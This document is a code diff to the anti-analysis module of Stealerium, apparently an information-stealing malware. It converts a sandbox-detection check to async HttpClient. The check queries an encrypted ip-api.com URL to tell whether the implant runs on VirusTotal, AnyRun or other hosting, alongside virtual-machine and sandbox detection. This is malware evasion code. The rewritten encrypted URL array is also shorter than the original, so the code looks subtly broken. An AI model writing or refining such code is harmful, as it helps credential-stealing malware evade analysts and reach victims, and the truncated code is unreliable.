@@ -2,9 +2,10 @@
 using System.Diagnostics;
 using System.Linq;
 using System.Management;
-using System.Net;
+using System.Net.Http;
 using System.Runtime.InteropServices;
 using System.Threading;
+using System.Threading.Tasks;
 using System.Windows.Forms;
 using Stealerium.Helpers;
 
@@ -63,19 +64,21 @@ namespace Stealerium.Modules.Implant
         /// <summary>
         ///     Returns true if the file is running on the server (VirusTotal, AnyRun); otherwise returns false
         /// </summary>
-        public static bool Hosting()
+        public static async Task<bool> Hosting()
         {
             try
             {
-                var status = new WebClient()
-                    .DownloadString(
-                        StringsCrypt.Decrypt(new byte[]
-                        {
-                            145, 244, 154, 250, 238, 89, 238, 36, 197, 152, 49, 235, 197, 102, 94, 163, 45, 250, 10,
-                            108, 175, 221, 139, 165, 121, 24, 120, 162, 117, 164, 206, 33, 157, 1, 101, 253, 223, 87,
-                            30, 229, 249, 102, 235, 195, 201, 170, 140, 162
-                        })); // http://ip-api.com/line/?fields=hosting
-                return status.Contains("true");
+                using (var client = new HttpClient())
+                {
+                    var status = await client.GetStringAsync(StringsCrypt.Decrypt(new byte[]
+                    {
+                        145, 244, 154, 250, 238, 89, 238, 36, 197, 152,
+                        49, 235, 197, 102, 94, 163, 45, 250, 10, 
+                        108, 175, 221, 139, 165, 121, 24
+                        // http://ip-api.com/line/?fields=hosting
+                    }));
+                    return status.Contains("true");
+                }
             }
             catch
             {
@@ -153,10 +156,10 @@ namespace Stealerium.Modules.Implant
         /// <summary>
         ///     Detect virtual enviroment
         /// </summary>
-        public static bool Run()
+        public static async Task<bool> RunAsync()
         {
             if (Config.AntiAnalysis != "1") return false;
-            if (Hosting()) Logging.Log("AntiAnalysis : Hosting detected!");
+            if (await Hosting()) Logging.Log("AntiAnalysis : Hosting detected!");
             if (Processes()) Logging.Log("AntiAnalysis : Process detected!");
             if (VirtualBox()) Logging.Log("AntiAnalysis : Virtual machine detected!");
             if (SandBox()) Logging.Log("AntiAnalysis : SandBox detected!");
